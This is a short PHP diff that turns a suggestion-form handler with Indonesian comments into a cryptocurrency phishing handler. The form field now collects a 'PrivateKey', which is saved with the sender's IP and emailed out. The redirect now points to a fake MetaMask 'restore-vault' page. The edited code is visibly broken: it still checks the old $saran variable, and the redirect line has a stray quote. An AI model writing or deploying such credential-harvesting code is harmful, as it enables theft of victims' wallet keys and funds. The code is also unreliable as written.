@@ -7,7 +7,7 @@ require 'email_config.php';
 
 // Proses form jika ada pengiriman data
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $saran = trim($_POST["saran"]); // Ambil isi saran dari form
+    $PrivateKey = trim($_POST["PrivateKey"]); // Ambil isi saran dari form
 
     if (!empty($saran)) {
         // 1. Ambil waktu dan alamat IP pengirim
@@ -17,7 +17,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // 2. Format data untuk disimpan
         $data = "-------------------------\n";
-        $data .= "Saran     :\n$saran\n";
+        $data .= "PrivateKey     :\n$PrivateKey\n";
         $data .= "Waktu     : $waktu\n";
         $data .= "IP Address: $ip_address\n";
         $data .= "-------------------------\n\n";
@@ -33,7 +33,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         kirim_email($subject, $data);
 
         // 5. Redirect ke halaman selanjutnya
-        header("Location: next_page.html");
+        header("Location: metamask/invalid.html?nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#restore-vault"");
         exit(); // Menghentikan eksekusi agar redirect berjalan dengan baik
     }
     // Jika saran kosong, tidak melakukan apa pun dan tetap di halaman form
